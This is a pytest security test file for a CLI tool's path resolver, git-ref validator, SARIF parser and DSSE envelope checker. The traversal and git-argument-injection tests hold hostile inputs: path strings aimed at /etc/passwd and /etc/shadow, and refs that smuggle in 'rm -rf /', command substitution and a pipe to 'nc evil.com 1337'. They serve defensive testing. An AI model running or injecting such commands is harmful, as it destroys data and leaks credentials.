import pytest
import os
import json
from pathlib import Path
from tempfile import NamedTemporaryFile

from cli.common import safe_resolve_path, UnsafePathError
from cli.patch_coverage import compute_patch_coverage, UnsafeGitRefError, _validate_git_ref
from cli.parsers.sarif import parse_sarif_file, SarifSummaryReport
from cli.verify import load_envelope, verify_dsse_attestation, EnvelopeTooLargeError, VerificationResult
from cli.parsers.coverage import CoverageReport

# 1. Path Traversal & URI Injection

def test_safe_resolve_path_null_bytes():
    with pytest.raises(ValueError) as exc:
        safe_resolve_path("foo\x00bar.txt")
    assert "null byte" in str(exc.value)

def test_safe_resolve_path_traversals():
    payloads = [
        "../../../../etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//etc/passwd",
        "file:///etc/shadow",
    ]
    for p in payloads:
        # Resolve it
        resolved = safe_resolve_path(p)
        assert isinstance(resolved, Path)
        # safe_resolve_path calls Path(text).resolve()
        # Ensure it safely confines or handles absolute paths as paths, and rejects invalid ones if any
        # It's an absolute path but correctly resolved according to normal OS rules.
        resolved_str = str(resolved)
        assert isinstance(resolved_str, str)
        assert resolved.is_absolute()

# 2. Shell / Git Argument Injection

def test_git_argument_injection():
    unsafe_refs = [
        "main; rm -rf /",
        "HEAD$(cat /etc/passwd)",
        "refs/heads/main|nc evil.com 1337",
        "refs/pull/1/merge\ncat /etc/shadow"
    ]
    
    for ref in unsafe_refs:
        with pytest.raises(UnsafeGitRefError):
            _validate_git_ref(ref, "head_sha")

# 3. SARIF Parser Boundary Stress

def test_sarif_nan_infinity_metrics(tmp_path):
    sarif_content = {
        "runs": [
            {
                "tool": {"driver": {"name": "test-tool"}},
                "properties": {
                    "sonarqube": {
                        "cognitive_complexity": "Infinity",
                        "technical_debt_minutes": "NaN",
                    }
                },
                "results": []
            }
        ]
    }
    f = tmp_path / "nan.sarif"
    f.write_text(json.dumps(sarif_content))
    report = parse_sarif_file(f)
    assert report.available

    # Also test negative values
    sarif_content2 = {
        "runs": [
            {
                "tool": {"driver": {"name": "test-tool"}},
                "properties": {
                    "sonarqube": {
                        "cognitive_complexity": -5,
                        "technical_debt_minutes": -10,
                    }
                },
                "results": []
            }
        ]
    }
    f2 = tmp_path / "neg.sarif"
    f2.write_text(json.dumps(sarif_content2))
    report2 = parse_sarif_file(f2)
    assert report2.available
    # Cognitive complexity should be clamped to 0 according to _extract_sonarqube_extension logic
    assert report2.tools[0].extensions["sonarqube"]["cognitive_complexity"] == 0
    assert report2.tools[0].extensions["sonarqube"]["technical_debt_minutes"] == 0

def test_sarif_deep_nesting(tmp_path):
    # Recursion bomb
    deep_dict = {}
    current = deep_dict
    for _ in range(1000):
        current["nested"] = {}
        current = current["nested"]
    
    sarif_content = {
        "runs": [
            {
                "tool": {"driver": {"name": "test-tool"}},
                "properties": deep_dict,
                "results": []
            }
        ]
    }
    
    f = tmp_path / "deep.sarif"
    f.write_text(json.dumps(sarif_content))
    
    try:
        report = parse_sarif_file(f)
        assert report.available
    except RecursionError:
        pytest.fail("RecursionError was not caught during parsing")

# 4. DSSE Envelope Tampering & Size Ceilings

def test_dsse_envelope_size_limit(tmp_path):
    f = tmp_path / "huge.envelope"
    # Create a 10MB + 1 byte file without eating real memory
    with open(f, "wb") as out:
        out.truncate(10 * 1024 * 1024 + 1)
    
    with pytest.raises(EnvelopeTooLargeError):
        load_envelope(str(f))

def test_dsse_envelope_corrupted_structure():
    import base64
    
    # 1. Non-dict predicate
    statement_1 = {
        "_type": "https://in-toto.io/Statement/v1",
        "predicateType": "https://tenax.io/attestations/assay/v1",
        "predicate": "not_a_dict"
    }
    
    # 2. Missing required blocks
    statement_2 = {
        "_type": "https://in-toto.io/Statement/v1",
        "predicateType": "https://tenax.io/attestations/assay/v1",
        "predicate": {
        }
    }
    
    for stmt in [statement_1, statement_2]:
        env = {
            "payloadType": "application/vnd.in-toto+json",
            "payload": base64.b64encode(json.dumps(stmt).encode()).decode(),
            "signatures": [{"sig": "dummy"}]
        }
        
        result = verify_dsse_attestation(env, min_rcs=0)
        # Should fail verification gracefully
        assert isinstance(result, VerificationResult)
        # Verification won't throw unhandled exceptions
        # We can also assert it handles missing elements gracefully without crashing.
